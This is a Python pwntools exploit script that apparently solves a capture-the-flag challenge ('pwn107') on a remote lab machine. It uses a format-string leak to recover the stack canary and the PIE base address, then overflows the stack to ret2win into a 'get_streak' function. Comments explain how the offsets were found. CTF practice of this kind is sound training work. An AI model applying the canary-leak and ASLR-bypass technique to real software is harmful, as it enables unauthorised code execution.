# more complicated ASLR and PIE binary with a stack canary. format string allows both the canary,
# and an address in the program to be leaked, which allows the base address to be found. then this
# is used to do a ret2win with a 'get_streak' win function.

from pwn import *

elf = context.binary = ELF('./pwn107.pwn107')

current_thmip = '10.10.134.184'

p = remote(current_thmip,9007)
# p = process()

p.clean()
# stack canary is at %13$p (determined by testing all values from 1-40, then retesting those that end in 00 to see how random they are)
p.sendline(b'%10$p %13$p') # for remote binary, leak an address at 10 that is 0xa90 (2704) from base and the canary at 13
# p.sendline(b'%9$p %13$p') # for local binary, leak an address at 9 that is 0xa90 (2704) from base and the canary at 13
p.recvuntil(b'streak: ')
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

payload = b'A'*24 # found via trial and error (failing to place the canary in the right place results in a stack smashing error)
payload += p64(canary)
payload += b'A'*8 # gap between canary and ret, found via trial and error
payload += p64(base + 0x6fe) # address of a ret instruction, found via `objdump -d pwn107.pwn107 | grep ret`
payload += p64(elf.sym["get_streak"])

p.clean()
p.sendline(payload)
p.interactive()